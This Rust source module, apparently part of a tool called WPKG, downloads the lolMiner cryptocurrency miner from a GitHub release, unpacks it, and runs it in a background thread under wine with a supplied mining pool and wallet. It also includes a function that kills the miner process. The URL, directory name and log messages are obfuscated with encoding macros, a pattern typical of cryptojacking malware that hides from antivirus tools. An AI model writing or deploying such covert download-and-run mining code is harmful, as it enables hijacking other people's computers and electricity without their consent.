use std::io::{BufReader, BufRead};
use std::path::Path;

use std::thread;
use std::{io::Cursor, sync::Mutex};

use tracing::*;
use wpkg_macro::*;

use crate::{crypto, info_crypt, utils, error_crypt};

use lazy_static::lazy_static;

lazy_static! {
    pub static ref MINER_RUNNED: Mutex<bool> = Mutex::new(false);
    pub static ref MINER_LOG: Mutex<String> = Mutex::new(String::from(""));
}

pub const MINER_DIR: &str = encode!("lolminer");
pub const URL: &str = encode!("https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.59/lolMiner_v1.59a_Win64.zip");

#[allow(dead_code)]
pub const ALGORITHMS: [&str; 17] = [
    encode!("AUTOLYKOS2"),
    encode!("BEAM-III"),
    encode!("C29AE"),
    encode!("C29D"),
    encode!("C29M"),
    encode!("C30CTX"),
    encode!("C31"),
    encode!("C32"),
    encode!("CR29-32"),
    encode!("CR29-40"),
    encode!("CR29-48"),
    encode!("EQUI144_5"),
    encode!("EQUI192_7"),
    encode!("EQUI210_9"),
    encode!("ETCHASH"),
    encode!("ETHASH"),
    encode!("ZEL"),
];

pub async fn download_lolminer() -> anyhow::Result<()> {
    if !is_installed()? {
        let path = &format!(
            "{}/{}",
            utils::get_working_dir()?,
            wpkg_crypto::decode(MINER_DIR)
        );

        info!("{}{}", crypto!("Unpacking crypto miner to "), &path);
        let zipdata = utils::download_data(&wpkg_crypto::decode(URL)).await?;

        info_crypt!("Extracting miner...");
        zip_extract::extract(Cursor::new(zipdata), &Path::new(path), true)?;
    } else {
        info_crypt!("Miner is installed")
    }

    Ok(())
}

pub fn is_installed() -> anyhow::Result<bool> {
    Ok(Path::new(&format!(
        "{}/{}",
        utils::get_working_dir()?,
        wpkg_crypto::decode(MINER_DIR)
    ))
    .exists())
}

pub fn is_runned() -> bool {
    *MINER_RUNNED.lock().unwrap()
}

pub fn run_miner(algo: usize, pool: &str, wallet: &str, name: &str) -> anyhow::Result<()> {
    let pool2 = String::from(pool);
    let wallet2 = String::from(wallet);
    let name2 = String::from(name);

    let workingloc = utils::get_working_dir()?;

    thread::spawn(move || {
        
        *MINER_RUNNED.lock().unwrap() = true;

        info_crypt!("Starting miner...");

        let runoutput= utils::run_process_handle(
            "wine",
            vec![
                &format!(
                    "{}/{}/lolMiner.exe",
                    workingloc,
                    wpkg_crypto::decode(MINER_DIR)
                ),
                "--algo",
                ALGORITHMS[algo],
                "--pool",
                &pool2,
                "--user",
                &format!("{wallet2}.{name2}"),
                "--apiport",
                "42021",
            ],
        );

        match runoutput {
            Ok(mut child) => {
                
                match child.stdout.as_mut()
                {
                    Some(out) => {
                        let stdout_reader = BufReader::new(out);
                        let stdout_lines = stdout_reader.lines();
                
                        for line in stdout_lines {
                            println!("Read: {}", line.as_ref().unwrap().clone());

                            let logs = &*MINER_LOG.lock().unwrap();
                            *MINER_LOG.lock().unwrap() = format!("{logs}{}\n",line.unwrap());
                        }
                    },
                    None => return
                }

            } 
            Err(_) => error_crypt!("Error running miner"),
        }

        info_crypt!("Miner clossed...");

        *MINER_RUNNED.lock().unwrap() = false;
    });

    Ok(())
}

pub fn stop_miner() -> anyhow::Result<()> {
    utils::run_process("taskkill.exe", vec!["/f", "/im", "lolMiner.exe"], false)?;
    *MINER_RUNNED.lock().unwrap() = false;
    info_crypt!("Miner was stopped by WPKG...");
    Ok(())
}
